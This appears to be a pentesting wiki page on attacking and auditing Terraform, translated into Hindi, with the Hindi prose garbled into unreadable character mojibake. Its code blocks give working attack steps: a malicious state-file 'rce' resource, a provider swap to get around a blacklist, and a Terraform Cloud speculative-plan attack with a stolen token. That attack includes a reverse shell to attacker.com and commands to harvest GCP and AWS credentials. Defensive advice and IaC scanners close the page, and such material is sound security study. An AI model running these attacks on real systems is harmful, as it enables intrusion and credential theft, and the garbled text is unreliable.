рдмрд╛рдж state рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдирдХрд▓реА рд╕рдВрд╕рд╛рдзрди рдХреЛ рд╣рдЯрд╛ рджреЗрдЧрд╛, рдЕрдкрдиреЗ рдЖрдк рдХреЛ рд╕рд╛рдлрд╝ рдХрд░рддреЗ рд╣реБрдПред рдЗрд╕ рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП рд╕реНрд░реЛрдд рдХреЛрдб рд╣реЛрд╕реНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ [GitHub рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА](https://github.com/offensive-actions/terraform-provider-statefile-rce) рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдФрд░ рдПрдХ рдкреВрд░реНрдг рдбреЗрдореЛ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕реЗ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдмрд╕ `resources` рдРрд░реЗ рдХреЗ рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рди рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ рдФрд░ `name` рдФрд░ `command` рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░реЗрдВ:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
рдлрд┐рд░, рдЬреИрд╕реЗ рд╣реА `terraform` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдЖрдкрдХрд╛ рдХреЛрдб рдЪрд▓реЗрдЧрд╛ред

### рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╣рдЯрд╛рдирд╛ <a href="#deleting-resources" id="deleting-resources"></a>

рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдирд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ 2 рддрд░реАрдХреЗ рд╣реИрдВ:

1. **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдирд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рд╛рдЬреНрдп рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдирд╛рдо рдХреЗ рд╕рд╛рде рдПрдХ рд╕рдВрд╕рд╛рдзрди рдбрд╛рд▓реЗрдВ**

рдХреНрдпреЛрдВрдХрд┐ terraform рджреЗрдЦреЗрдЧрд╛ рдХрд┐ рд╕рдВрд╕рд╛рдзрди рдХрд╛ рдЕрд╕реНрддрд┐рддреНрд╡ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдпрд╣ рдЗрд╕реЗ рдирд╖реНрдЯ рдХрд░ рджреЗрдЧрд╛ (рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрд╕рд╛рдзрди ID рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЬреЛ рдЗрдВрдЧрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ)ред рдкрд┐рдЫрд▓реЗ рдкреГрд╖реНрда рд╕реЗ рдЙрджрд╛рд╣рд░рдг:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **рд╕рдВрд╕рд╛рдзрди рдХреЛ рдЗрд╕ рддрд░рд╣ рд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЗрд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рди рд╣реЛ (рддрд╛рдХрд┐ рдЗрд╕реЗ рд╣рдЯрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдлрд┐рд░ рд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ)**

EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рд▓рд┐рдП, рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдкреНрд░рдХрд╛рд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ terraform рдХреЛ рдЗрд╕реЗ рд╣рдЯрд╛рдиреЗ рдФрд░ рдлрд┐рд░ рд╕реЗ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред

### рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯреЗрдб рдкреНрд░рджрд╛рддрд╛ рдХреЛ рдмрджрд▓реЗрдВ

рдпрджрд┐ рдЖрдк рдРрд╕реА рд╕реНрдерд┐рддрд┐ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рддреЗ рд╣реИрдВ рдЬрд╣рд╛рдБ `hashicorp/external` рдХреЛ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░рдХреЗ `external` рдкреНрд░рджрд╛рддрд╛ рдХреЛ рдлрд┐рд░ рд╕реЗ рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдиреЛрдЯ: рд╣рдо https://registry.terraform.io/providers/nazarewk/external/latest рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдХрд╛рд╢рд┐рдд `external` рдкреНрд░рджрд╛рддрд╛ рдХреА рдПрдХ рдлреЛрд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдЖрдк рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рдлреЛрд░реНрдХ рдпрд╛ рдлрд┐рд░ рд╕реЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рднреА рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
рдлрд┐рд░ рдЖрдк рд╕рд╛рдорд╛рдиреНрдп рдХреЗ рдЕрдиреБрд╕рд╛рд░ `external` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE рдФрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди

рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп рд▓рдХреНрд╖рд┐рдд рдХреНрд▓рд╛рдЙрдб рдЦрд╛рддреЗ рдореЗрдВ рдкрд┐рд╡рдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорд╛рдирд┐рдд рдпреЛрдЬрдирд╛рдУрдВ рдХреЗ рджреМрд░рд╛рди Terraform Cloud (TFC) рд░рдирд░реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

- рдкреВрд░реНрд╡ рд╢рд░реНрддреЗрдВ:
- рдПрдХ рдбреЗрд╡рд▓рдкрд░ рдорд╢реАрди рд╕реЗ Terraform Cloud рдЯреЛрдХрди рдЪреБрд░рд╛рдирд╛ред CLI рдЯреЛрдХрди рдХреЛ рдкреНрд▓реЗрдирдЯреЗрдХреНрд╕реНрдЯ рдореЗрдВ `~/.terraform.d/credentials.tfrc.json` рдкрд░ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИред
- рдЯреЛрдХрди рдХреЛ рд▓рдХреНрд╖рд┐рдд рд╕рдВрдЧрдарди/рд╡рд░реНрдХрд╕реНрдкреЗрд╕ рдФрд░ рдХрдо рд╕реЗ рдХрдо `plan` рдЕрдиреБрдорддрд┐ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред VCS-рд╕рдорд░реНрдерд┐рдд рд╡рд░реНрдХрд╕реНрдкреЗрд╕ CLI рд╕реЗ `apply` рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдлрд┐рд░ рднреА рдЕрдиреБрдорд╛рдирд┐рдд рдпреЛрдЬрдирд╛рдУрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

- TFC API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд░реНрдХрд╕реНрдкреЗрд╕ рдФрд░ VCS рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдЦреЛрдЬреЗрдВ:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- рдПрдХ рдЕрдиреБрдорд╛рдирд┐рдд рдпреЛрдЬрдирд╛ рдХреЗ рджреМрд░рд╛рди рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ, рдмрд╛рд╣рд░реА рдбреЗрдЯрд╛ рд╕реНрд░реЛрдд рдФрд░ Terraform Cloud "cloud" рдмреНрд▓реЙрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ VCS-рд╕рдорд░реНрдерд┐рдд рдХрд╛рд░реНрдпрдХреНрд╖реЗрддреНрд░ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░реЗрдВ:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
TFC рд░рдирд░ рдкрд░ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг rsync.sh:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
рдПрдХ рдЕрдиреБрдорд╛рдирд┐рдд рдпреЛрдЬрдирд╛ рдЪрд▓рд╛рдПрдБ рддрд╛рдХрд┐ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рдЕрд╕реНрдерд╛рдпреА рд░рдирд░ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:
```bash
terraform init
terraform plan
```
- рд░рдирд░ рд╕реЗ рдЗрдВрдЬреЗрдХреНрдЯреЗрдб рдХреНрд▓рд╛рдЙрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░реЗрдВред рд░рди рдХреЗ рджреМрд░рд╛рди, TFC рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рджрд╛рддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
рд░рдирд░ рдХрд╛рд░реНрдпрд╢реАрд▓ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдЕрдкреЗрдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ:
- GCP:
- `tfc-google-application-credentials` (рд╡рд░реНрдХрд▓реЛрдб рдЖрдЗрдбреЗрдВрдЯрд┐рдЯреА рдлреЗрдбрд░реЗрд╢рди JSON рдХреЙрдиреНрдлрд╝рд┐рдЧ)
- `tfc-gcp-token` (рдЕрд▓реНрдкрдХрд╛рд▓рд┐рдХ GCP рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди)
- AWS:
- `tfc-aws-shared-config` (рд╡реЗрдм рдЖрдЗрдбреЗрдВрдЯрд┐рдЯреА/OIDC рднреВрдорд┐рдХрд╛ рдЕрдиреБрдореЛрджрди рдХреЙрдиреНрдлрд╝рд┐рдЧ)
- `tfc-aws-token` (рдЕрд▓реНрдкрдХрд╛рд▓рд┐рдХ рдЯреЛрдХрди; рдХреБрдЫ рд╕рдВрдЧрдардиреЛрдВ рдореЗрдВ рд╕реНрдерд┐рд░ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)

- VCS рдЧреЗрдЯреНрд╕ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд▓реНрдкрдХрд╛рд▓рд┐рдХ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЖрдЙрдЯ-рдСрдл-рдмреИрдВрдб рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
рдЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд╕рд╛рде, рд╣рдорд▓рд╛рд╡рд░ рд╕реАрдзреЗ рдореВрд▓ CLIs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдмрдирд╛рддреЗ/рд╕рдВрд╢реЛрдзрд┐рдд/рдирд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, PR-рдЖрдзрд╛рд░рд┐рдд рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рддреЗ рд╣реБрдП рдЬреЛ VCS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `apply` рдХреЛ рд░реЛрдХрддреЗ рд╣реИрдВред

- рд░рдХреНрд╖рд╛ рд╕рдВрдмрдВрдзреА рдорд╛рд░реНрдЧрджрд░реНрд╢рди:
- TFC рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ/рдЯреАрдореЛрдВ рдФрд░ рдЯреЛрдХрдиреЛрдВ рдкрд░ рдиреНрдпреВрдирддрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд▓рд╛рдЧреВ рдХрд░реЗрдВред рд╕рджрд╕реНрдпрддрд╛рдУрдВ рдХрд╛ рдСрдбрд┐рдЯ рдХрд░реЗрдВ рдФрд░ рдмрдбрд╝реЗ рдорд╛рд▓рд┐рдХреЛрдВ рд╕реЗ рдмрдЪреЗрдВред
- рд╕рдВрд╡реЗрджрдирд╢реАрд▓ VCS-рд╕рдорд░реНрдерд┐рдд рдХрд╛рд░реНрдпрдХреНрд╖реЗрддреНрд░реЛрдВ рдкрд░ `plan` рдЕрдиреБрдорддрд┐ рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ рдЬрд╣рд╛рдБ рд╕рдВрднрд╡ рд╣реЛред
- Sentinel рдиреАрддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдкреНрд░рджрд╛рддрд╛/рдбреЗрдЯрд╛ рд╕реНрд░реЛрдд рдЕрдиреБрдорддрд┐ рд╕реВрдЪрд┐рдпреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░реЗрдВ рддрд╛рдХрд┐ `data "external"` рдпрд╛ рдЕрдЬреНрдЮрд╛рдд рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗред рдкреНрд░рджрд╛рддрд╛ рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рдкрд░ HashiCorp рдорд╛рд░реНрдЧрджрд░реНрд╢рди рджреЗрдЦреЗрдВред
- рд╕реНрдерд┐рд░ рдХреНрд▓рд╛рдЙрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ OIDC/WIF рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВ; рдзрд╛рд╡рдХреЛрдВ рдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдорд╛рдиреЗрдВред рдЕрдиреБрдорд╛рдирд┐рдд рдпреЛрдЬрдирд╛ рдЪрд▓рд╛рдиреЗ рдФрд░ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдирд┐рдХрд╛рд╕реА рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВред
- `tfc-*` рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯреНрд╕ рдХреЗ рдирд┐рд╖реНрдХрд░реНрд╖рдг рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдФрд░ рдпреЛрдЬрдирд╛рдУрдВ рдХреЗ рджреМрд░рд╛рди рд╕рдВрджрд┐рдЧреНрдз `external` рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЙрдкрдпреЛрдЧ рдкрд░ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдВред

## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдСрдбрд┐рдЯ рдЙрдкрдХрд░рдг

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk рдПрдХ рд╡реНрдпрд╛рдкрдХ Infrastructure as Code (IaC) рд╕реНрдХреИрдирд┐рдВрдЧ рд╕рдорд╛рдзрд╛рди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ Terraform, CloudFormation, Kubernetes, рдФрд░ рдЕрдиреНрдп IaC рдкреНрд░рд╛рд░реВрдкреЛрдВ рдореЗрдВ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИред

- **рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ:**
- рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рдЕрдиреБрдкрд╛рд▓рди рдореБрджреНрджреЛрдВ рдХреЗ рд▓рд┐рдП рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рд╕реНрдХреИрдирд┐рдВрдЧред
- рд╕рдВрд╕реНрдХрд░рдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ (GitHub, GitLab, Bitbucket) рдХреЗ рд╕рд╛рде рдПрдХреАрдХрд░рдгред
- рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╕реБрдзрд╛рд░ рдкреБрд▓ рдЕрдиреБрд░реЛрдзред
- рд╡рд┐рд╕реНрддреГрдд рд╕реБрдзрд╛рд░ рд╕рд▓рд╛рд╣ред
- **рд╕рд╛рдЗрди рдЕрдк:** [Snyk](https://snyk.io/) рдкрд░ рдПрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдПрдВред
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** рдПрдХ рд╕реНрдереИрддрд┐рдХ рдХреЛрдб рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЛрдб (IaC) рдХреЗ рд▓рд┐рдП рд╣реИ рдФрд░ рдпрд╣ рдЫрд╡рд┐рдпреЛрдВ рдФрд░ рдУрдкрди-рд╕реЛрд░реНрд╕ рдкреИрдХреЗрдЬреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕рдВрд░рдЪрдирд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг (SCA) рдЙрдкрдХрд░рдг рднреА рд╣реИред

рдпрд╣ [Terraform](https://terraform.io/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдХреНрд▓рд╛рдЙрдб рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░, [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), рдпрд╛ [OpenTofu](https://opentofu.org/) рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЧреНрд░рд╛рдл-рдЖрдзрд╛рд░рд┐рдд рд╕реНрдХреИрдирд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдЕрдиреБрдкрд╛рд▓рди рдХреА рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИред

рдпрд╣ [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╕рд╛рдорд╛рдиреНрдп рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рдПрдХреНрд╕рдкреЛрдЬрд╝рд░ (CVEs) рдХреЗ рд▓рд┐рдП рдУрдкрди-рд╕реЛрд░реНрд╕ рдкреИрдХреЗрдЬреЛрдВ рдФрд░ рдЫрд╡рд┐рдпреЛрдВ рдХрд╛ рд╕реНрдХреИрди рд╣реИред
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` рдПрдХ рд╣рд▓реНрдХрд╛, рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдЕрдиреБрдкрд╛рд▓рди рдкрд░ рдХреЗрдВрджреНрд░рд┐рдд рдкрд░реАрдХреНрд╖рдг рдврд╛рдВрдЪрд╛ рд╣реИ рдЬреЛ terraform рдХреЗ рдЦрд┐рд▓рд╛рдл рдирдХрд╛рд░рд╛рддреНрдордХ рдкрд░реАрдХреНрд╖рдг рдХреНрд╖рдорддрд╛ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЗ рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░-рдПрдЬрд╝-рдХреЛрдб рдХреЗ рд▓рд┐рдП рд╣реИред

- **compliance:** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХреЛрдб рд╕реБрд░рдХреНрд╖рд╛ рдорд╛рдирдХреЛрдВ, рдЖрдкрдХреЗ рдЕрдкрдиреЗ рдХрд╕реНрдЯрдо рдорд╛рдирдХреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░ рд░рд╣рд╛ рд╣реИ
- **behaviour driven development:** рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд▓рдЧрднрдЧ рд╣рд░ рдЪреАрдЬ рдХреЗ рд▓рд┐рдП BDD рд╣реИ, IaC рдХреЗ рд▓рд┐рдП рдХреНрдпреЛрдВ рдирд╣реАрдВ?
- **portable:** рдмрд╕ рдЗрд╕реЗ `pip` рд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ рдпрд╛ `docker` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЪрд▓рд╛рдПрдВред рджреЗрдЦреЗрдВ [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** рдпрд╣ рдЖрдкрдХреЗ рдХреЛрдб рдХреЛ рддреИрдирд╛рдд рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдорд╛рдиреНрдп рдХрд░рддрд╛ рд╣реИ
- **easy to integrate:** рдпрд╣ рдЖрдкрдХреЗ рдкрд╛рдЗрдкрд▓рд╛рдЗрди (рдпрд╛ git hooks рдореЗрдВ) рдореЗрдВ рдЪрд▓ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рднреА рддреИрдирд╛рддрд┐рдпреЛрдВ рдХреЛ рдорд╛рдиреНрдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
- **segregation of duty:** рдЖрдк рдЕрдкрдиреЗ рдкрд░реАрдХреНрд╖рдгреЛрдВ рдХреЛ рдПрдХ рдЕрд▓рдЧ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ рдПрдХ рдЕрд▓рдЧ рдЯреАрдо рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реИред

> [!NOTE]
> рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢, рдпрджрд┐ рдХреЛрдб рдХреБрдЫ рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬрд┐рди рддрдХ рдЖрдкрдХреА рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк `terraform plan` рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ рдФрд░ рдЗрд╕ рдЙрдкрдХрд░рдг рдХреЛ рдирд╣реАрдВ рдЪрд▓рд╛ рдкрд╛рдПрдВрдЧреЗред
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsec рдЖрдкрдХреЗ terraform рдХреЛрдб рдХрд╛ рд╕реНрдереИрддрд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рдВрднрд╛рд╡рд┐рдд рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХреЗред

